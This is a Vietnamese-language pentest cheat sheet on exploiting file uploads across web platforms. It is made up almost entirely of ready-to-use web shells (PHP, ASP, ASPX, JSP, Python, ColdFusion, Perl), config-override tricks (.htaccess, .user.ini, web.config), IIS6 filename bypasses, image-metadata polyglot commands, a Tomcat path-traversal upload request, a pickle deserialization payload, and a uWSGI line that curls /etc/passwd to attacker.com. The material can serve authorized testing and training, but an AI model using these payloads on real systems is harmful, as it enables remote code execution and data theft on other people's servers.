# File Upload — Platform-Specific Techniques

## Tổng quan

Mỗi nền tảng web (PHP, ASP.NET, Java, Python...) có đặc thù riêng trong cách xử lý file upload, xác định extension, và thực thi file. Hiểu rõ đặc điểm từng platform giúp chọn đúng payload type, extension, và kỹ thuật bypass phù hợp.

## PHP

### Web Shell cơ bản

```php
<?php system($_GET['cmd']); ?>
```

```php
<?php echo shell_exec($_REQUEST['cmd']); ?>
```

```php
<?php echo file_get_contents('/etc/passwd'); ?>
```

### Executable Extensions

```
.php, .php2, .php3, .php4, .php5, .php6, .php7
.phps, .pht, .phtm, .phtml, .pgif, .shtml
.phar, .inc, .hphp, .ctp, .module
```

PHPv8: `.php`, `.php4`, `.php5`, `.phtml`, `.module`, `.inc`, `.hphp`, `.ctp`

### .htaccess trick

Upload `.htaccess` để map custom extension sang PHP handler:

```apache
AddType application/x-httpd-php .evil
```

Sau đó upload `shell.evil` chứa PHP code.

### .phar Files

`.phar` (PHP Archive) hoạt động tương tự `.jar` cho Java. Có thể execute trực tiếp hoặc include trong script:

```php
// Attacker upload shell.phar
// Nếu ứng dụng có: include($_GET['page']);
// → include('phar://uploads/shell.phar')
```

### .inc và .module

`.inc` và `.module` thường dùng cho file PHP include. Nếu server cho phép upload và có LFI → code execution.

### PHP trên IIS — Character Conversion

| Input | Output | Khai thác                                     |
| ----- | ------ | --------------------------------------------- |
| `>`   | `?`    | Wildcard matching                             |
| `<`   | `*`    | Wildcard matching                             |
| `"`   | `.`    | `filename='web"config'` → ghi đè `web.config` |

### .user.ini trick

Khi PHP chạy ở CGI/FastCGI mode, `.user.ini` cho phép per-directory PHP config override:

```ini
; .user.ini — auto prepend shell vào mọi PHP file trong directory
auto_prepend_file=shell.jpg
```

Upload `.user.ini` + `shell.jpg` (chứa PHP code) vào cùng directory → bất kỳ PHP file nào trong directory đó sẽ tự động include `shell.jpg` trước khi chạy.

### Bypass `getimagesize()`

```bash
# GIF comment injection
gifsicle < legit.gif --comment "<?php system(\$_GET['cmd']); ?>" > shell.php.gif

# EXIF metadata injection
exiftool -Comment='<?php system($_GET["cmd"]); ?>' img.jpg
```

## ASP / ASP.NET

### Web Shell cơ bản

**Classic ASP:**

```asp
<%
Dim cmd
cmd = Request("cmd")
Set shell = Server.CreateObject("WScript.Shell")
Set exec = shell.Exec("cmd /c " & cmd)
Response.Write(exec.StdOut.ReadAll())
%>
```

**ASP.NET (ASPX):**

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request["cmd"];
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + cmd;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.UseShellExecute = false;
p.Start();
Response.Write(p.StandardOutput.ReadToEnd());
%>
```

### Executable Extensions

```
.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd
.cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml
.asa, .cer, .shtml
```

### web.config trick

Upload `web.config` để enable handler cho custom extension:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers>
            <add name="aspx-handler" path="*.evil" verb="*"
                 type="System.Web.UI.PageHandlerFactory"
                 resourceType="Unspecified" />
        </handlers>
    </system.webServer>
</configuration>
```

### IIS6 Specific

| Kỹ thuật      | Payload                         | Cơ chế                                       |
| ------------- | ------------------------------- | -------------------------------------------- |
| Semicolon     | `file.asp;.jpg`                 | IIS6 cắt tên tại `;` → thực thi `.asp`       |
| Directory ext | `folder.asp\file.txt`           | File trong folder `.asp` bị thực thi như ASP |
| ADS directory | `folder.asp::$Index_Allocation` | Tạo directory có tên `folder.asp`            |

## Java (JSP / Servlet)

### Web Shell cơ bản

```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while ((line = br.readLine()) != null) {
    out.println(line);
}
%>
```

### Executable Extensions

```
.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
```

### WAR File Deploy

Upload `.war` file (Web Application Archive) đến application server:

- Tomcat auto-deploy WAR trong `webapps/`
- JBoss deploy thông qua management interface
- WebSphere/WebLogic có deploy endpoints

### Tomcat — Path Traversal + GZIP

```http
POST /fileupload?token=..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Content-Type: application/octet-stream
Content-Encoding: gzip

<gzip-compressed JSP shell>
```

### Jetty — XML Auto-process

Upload `.xml` hoặc `.war` vào `$JETTY_BASE/webapps/` → tự động process → RCE.

## Python

### Web Shell cơ bản

```python
import os
import cgi
form = cgi.FieldStorage()
cmd = form.getvalue('cmd', 'id')
print("Content-Type: text/plain\n")
print(os.popen(cmd).read())
```

### CGI execution

Nếu server cấu hình CGI cho `.py`:

```
.py, .cgi
```

### Pickle deserialization

Upload file pickle chứa payload — nếu server `pickle.load()` file:

```python
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

with open('payload.pkl', 'wb') as f:
    pickle.dump(Exploit(), f)
```

### Jinja2/SSTI qua filename

Nếu filename được render trong template:

```
filename="{{7*7}}.jpg"          → Nếu output hiện 49 → SSTI
filename="{{config.items()}}.jpg"  → Leak config
```

## ColdFusion

### Extensions

```
.cfm, .cfml, .cfc, .dbm
```

### Web Shell

```cfml
<cfexecute name="cmd.exe" arguments="/c #URL.cmd#" variable="output" timeout="10" />
<cfoutput>#output#</cfoutput>
```

## Perl

### Extensions

```
.pl, .cgi
```

### Web Shell

```perl
#!/usr/bin/perl
use CGI;
my $q = CGI->new;
print $q->header('text/plain');
my $cmd = $q->param('cmd') || 'id';
print `$cmd`;
```

## uWSGI (Python/Ruby)

### Config injection (.ini)

```ini
[uwsgi]
; Command execution qua exec:// scheme
body = @(exec://whoami)
extra = @(exec://curl http://attacker.com/exfil?data=$(cat /etc/passwd))
```

**Trigger**: uWSGI restart hoặc auto-reload. Payload có thể nằm trong binary file (ảnh, PDF) vì uWSGI parse lax.

## Erlang (Yaws Web Server)

### Extension

```
.yaws
```

## Bảng tổng hợp Platform → Payload

| Platform    | Primary Extension | Web Shell Type        | Config Override          |
| ----------- | ----------------- | --------------------- | ------------------------ |
| PHP         | `.php`            | `<?php system(); ?>`  | `.htaccess`, `.user.ini` |
| ASP Classic | `.asp`            | `<% WScript.Shell %>` | `web.config`             |
| ASP.NET     | `.aspx`           | `<%@ Page %>`         | `web.config`             |
| Java/JSP    | `.jsp`            | `Runtime.exec()`      | `.war` deploy            |
| Python      | `.py`             | `os.popen()`          | CGI config               |
| ColdFusion  | `.cfm`            | `<cfexecute>`         | —                        |
| Perl        | `.pl`, `.cgi`     | backtick execution    | —                        |
| uWSGI       | `.ini`            | `@(exec://)`          | uWSGI config             |

## Xác định platform → Chọn payload

```
Xác định server technology?
│
├── PHP (PHPSESSID, .php URLs, X-Powered-By: PHP)
│   ├── Upload .php/.phtml/.phar web shell
│   ├── .htaccess / .user.ini config override
│   └── Polyglot PHP trong ảnh
│
├── ASP/.NET (ASP.NET_SessionId, .aspx URLs, IIS)
│   ├── Upload .aspx/.ashx web shell
│   ├── web.config handler mapping
│   └── IIS6: semicolon trick
│
├── Java (JSESSIONID, .jsp/.do URLs, Tomcat/Jetty)
│   ├── Upload .jsp web shell
│   ├── .war file deploy
│   └── Jetty XML auto-process
│
├── Python (Django/Flask indicators)
│   ├── .py CGI shell
│   ├── Pickle deserialization
│   └── SSTI qua filename
│
└── Không xác định
    ├── Thử nhiều extension/payload type
    └── Fingerprint qua error messages
```
